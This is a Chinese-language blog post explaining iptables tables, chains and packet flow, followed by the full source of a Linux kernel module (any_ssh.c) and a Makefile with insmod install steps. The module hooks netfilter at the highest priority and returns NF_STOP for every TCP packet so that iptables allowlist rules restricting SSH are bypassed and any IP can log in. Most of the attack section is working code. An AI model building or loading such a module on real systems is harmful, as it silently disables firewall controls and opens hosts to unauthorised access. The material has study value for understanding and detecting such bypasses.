---
layout: post
title: "Netfilter and Iptables：netfilter模块绕过iptables规则"
date: 2020-09-08 
description: "netfilter模块绕过iptables规则"
tag: Linux攻防
---   

### iptables 介绍及技术原理
![](/imag/20200908/1.png)
![](/imag/20200908/2.png)
![](/imag/20200908/3.png)
优先级次序（由高而低）：
raw --> mangle --> nat --> filter
------------------------------------------------------------------------------------
filter      表：负责过滤功能，防火墙；内核模块：iptables_filter
nat        表：network address translation，网络地址转换功能；内核模块：iptable_nat
mangle 表：拆解报文，做出修改，并重新封装 的功能；iptable_mangle
raw       表：关闭nat表上启用的连接追踪机制；iptable_raw
------------------------------------------------------------------------------------
PREROUTING      的规则可以存在于：raw表，mangle表，nat表。
INPUT                   的规则可以存在于：mangle表，filter表，（centos7中还有nat表，centos6中没有）。
FORWARD           的规则可以存在于：mangle表，filter表。
OUTPUT               的规则可以存在于：raw表mangle表，nat表，filter表。
POSTROUTING   的规则可以存在于：mangle表，nat表。
------------------------------------------------------------------------------------
raw        表中的规则可以被哪些链使用：PREROUTING，OUTPUT
mangle  表中的规则可以被哪些链使用：PREROUTING，INPUT，FORWARD，OUTPUT，POSTROUTING
nat         表中的规则可以被哪些链使用：PREROUTING，OUTPUT，POSTROUTING（centos7中还有INPUT，centos6中没有）
filter       表中的规则可以被哪些链使用：INPUT，FORWARD，OUTPUT
------------------------------------------------------------------------------------
### 我们可以将数据包通过防火墙的流程总结为下图：

![](/imag/20200908/4.png)
 如何绕过iptables规则？
有如下场景：
centos7主机限制了ssh的22端口的登录，只能由特定的ip登录
iptables规则如下：
首先在INPUT链中丢弃了所有通往22端口的tcp包
iptables -I INPUT -p tcp --dport 22 -j DROP
然后设置白名单，只允许某一特定ip通过
iptables -I INPUT -s 192.168.71.1 -p tcp --dport 22 -j ACCEPT

从上面的命令中我们可以分析出，INPUT链中新添加了两条规则，拒绝所有的包以及设置白名单，-I参数表示插入，后面的白名单规则的优先级会高于前面的规则，所以iptables会首先放行来自192.168.71.1的TCP包，而来自其它ip的通往22端口的tcp包则会被另一条规则drop掉，从而达到22端口限制ip登录的功能。
接下来我们编写Netfilter模块，绕过iptables规则，使得任意ip都可以登录ssh
iptables的 INPUT 链对应 Netfilter 的HOOK点为 NF_INET_LOCAL_IN，iptables -I INPUT -s 192.168.71.1 -p tcp --dport 22 -j ACCEPT 这条规则就相当于使用netfilter 在NF_INET_LOCAL_IN hook点注册了一个回调函数，这个函数只允许该ip的数据包通过，iptables的源码其实也是这么做的
所以我们的 nf_hook_ops 结构体将像下面这样初始化：
static struct nf_hook_ops anyssh_ops = {
    /* Fill in our hook structure */
   nfho.hook     = hook_func;
   /* Handler function */
   nfho.hooknum  = NF_INET_LOCAL_IN;
   nfho.pf       = PF_INET;
   nfho.priority = NF_IP_PRI_FIRST;   /* Make our func first */
}
hook回调函数：
我们过滤了tcp数据包，并且将所有的tcp包都返回 NF_STOP

NF_STOP表示报文通过了某个钩子函数的处理，后面的钩子函数你们就不要处理了，谁让你的优先级低呢，我就可以替你做主。假设NF_INET_LOCAL_IN中注册了两个钩子函数hook1和hook2，hook1的优先级高于hook2，hook2设定的处理结果是NF_DROP。如果hook1设定的处理结果是NF_ACCEPT，那么报文就不会递交给应用程序，因为hook2会把报文丢弃掉。如果hook1设定的处理结果是NF_STOP，那么报文就会提交给应用程序，因为hook1放行了，根本不会给hook2处理的机会。这个机制只在一个HOOK点的函数链中生效。也就是说iptables规则假设所处于的链为INPUT，则netfiler hook函数必须处于NF_INET_LOCAL_IN。
这么做的原因就是为了让iptables的规则失效，由于我们设置了 nfho.priority = NF_IP_PRI_FIRST; 我们的hook函数在INPUT这个链中处于最高优先级，只要直接返回NF_STOP，就没有后面iptbales什么事了，也就达到了任意ip都可以登录ssh的目的。
unsigned int hook_func(unsigned int hooknum,
                       struct sk_buff *skb,
                       const struct net_device *in,
                       const struct net_device *out,
                       int (*okfn)(struct sk_buff *))
{
    struct iphdr *ip1 = NULL;
    if (!skb){
        return NF_ACCEPT;
    }
    ip1 = ip_hdr(skb);
    if (NULL != ip1){
        if (IPPROTO_TCP == ip1->protocol){
            printk("tcp,STOP\n");
            return NF_STOP;
        }
    }else{
        printk("null!\n"); 
    }
    return NF_ACCEPT;
}

完整代码：
any_ssh.c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/skbuff.h>
#include <linux/ip.h>                  /* For IP header */
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>


static struct nf_hook_ops nfho;


unsigned int hook_func(unsigned int hooknum,
                       struct sk_buff *skb,
                       const struct net_device *in,
                       const struct net_device *out,
                       int (*okfn)(struct sk_buff *))
{
    struct iphdr *ip1 = NULL;
    if (!skb){
        return NF_ACCEPT;
    }
    ip1 = ip_hdr(skb);
    if (NULL != ip1){
        if (IPPROTO_TCP == ip1->protocol){
            printk("tcp,drop\n");
            //return NF_DROP;
            return NF_STOP;
        }
    }else{
        printk("null!\n"); 
    }
    return NF_ACCEPT;
}


int init_module()
{
   /* Fill in our hook structure */
   nfho.hook     = hook_func;
   /* Handler function */
   //nfho.hooknum  = NF_INET_PRE_ROUTING; /* First for IPv4 */
   nfho.hooknum  = NF_INET_LOCAL_IN;
   nfho.pf       = PF_INET;
   nfho.priority = NF_IP_PRI_FIRST;   /* Make our func first */
   printk("init_module,filter_tcp\n");
   nf_register_hook(&nfho);


   return 0;
}


/* Cleanup routine */
void cleanup_module()
{
    printk("cleanup_module,filter_tcp\n");
    nf_unregister_hook(&nfho);
}



Makefile

MODULE_NAME:=filter_tcp
ifneq ($(KERNELRELEASE),)
mymodule-objs:=${MODULE_NAME}.o
obj-m:=${MODULE_NAME}.o
else
PWD:=$(shell pwd)
KVER:=$(shell uname -r)


KDIR:=/lib/modules/$(shell uname -r)/build
all:
    $(MAKE) -C $(KDIR) M=$(PWD)
#clean:
    @rm -rf .*.com *.o *.mod.c  .tmp_versions modules.order Module.symvers
install:
    echo ${KDIR}
    @insmod ${MODULE_NAME}.ko
uninstall:
    @rmmod ${MODULE_NAME}.ko
endif


###转载请注明出处

安全编程交流：NzgyNDIxODg3


